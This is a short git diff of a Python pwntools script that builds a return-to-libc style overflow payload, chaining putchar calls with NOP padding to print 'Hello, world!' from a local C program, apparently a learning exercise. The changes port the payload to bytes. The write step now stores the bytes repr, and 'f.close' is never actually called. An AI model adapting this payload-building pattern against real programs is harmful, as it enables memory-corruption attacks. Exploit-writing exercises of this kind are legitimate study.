@@ -31,7 +31,7 @@ offset_putchar = 0x00000000
 
 def main():
     # payload = ""
-    padChar2 = "\x90"
+    padChar2 = b"\x90"
     padSize = 32
     # Initial payload
 
@@ -41,6 +41,7 @@ def main():
     payload = padChar2 * padSize
     for char in hello:  # Generate payload for printing 'Hello, world!'
         # payload += p32(libc_entry + offset_putchar)  # function p32 changes
+        
         payload += p32(libc_entry + offset_putchar)
         # memoryaddress to correct format (reversed and opcoded)
 
@@ -50,7 +51,7 @@ def main():
         # pwntools function pack, is packing our input to 32-bit memory
         # address with correct syntax. Ord is changing character to ASCII code
         payload += pack(ord(char), 32, 'little',  # function arguments
-                        False).replace("\x00", "\xff")
+                        False).replace(b"\x00", b"\xff")
         # Replacing nulls with '\xff', which are generated in by packing to
         #  fullfil 32-bit size
 
@@ -62,7 +63,7 @@ def main():
     # Writing payload to txt file just in case,
     # if we want to run program without script
     f = open("payload.txt", "w+")
-    f.write(payload)
+    f.write(str(payload))
     f.close
 
     # C program is using payload as args
